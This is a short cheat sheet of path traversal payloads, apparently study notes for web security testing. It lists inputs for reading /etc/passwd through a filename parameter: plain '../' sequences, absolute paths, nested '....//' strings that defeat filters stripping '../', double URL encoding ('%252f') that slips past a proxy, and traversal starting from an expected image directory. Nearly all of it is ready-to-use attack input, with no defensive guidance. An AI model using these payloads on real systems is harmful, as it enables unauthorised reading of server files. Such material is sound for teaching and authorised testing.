### Simple Relative

URL parameters can be escaped

```
../../../etc/passwd
```

---

```
filename=/etc/passwd
```

No need for directory escapes

---

### Nested Filter Bypass

```
....//
```

```
....\/
```

If you remove the ../ or ..\ in between, it defaults to ../ 

```
/image?filename=....//....//....//etc/passwd
```

---

### Double URL Encoded

```
..%252f..%252f..%252fetc/passwd
```

Standard Encoding (%2f for /): Used when the server blocks literal / characters.

Double Encoding (%252f for /):

% itself encodes to %25.

When sent as %252f, a web proxy decodes %25 to %, leaving %2f.

If the backend application decodes the string a second time, %2f becomes /, bypassing the proxy's strict filter.

---

### Validation of start of path

The filename path must start from image root sometimes

```
/var/www/images/../../../etc/passwd
```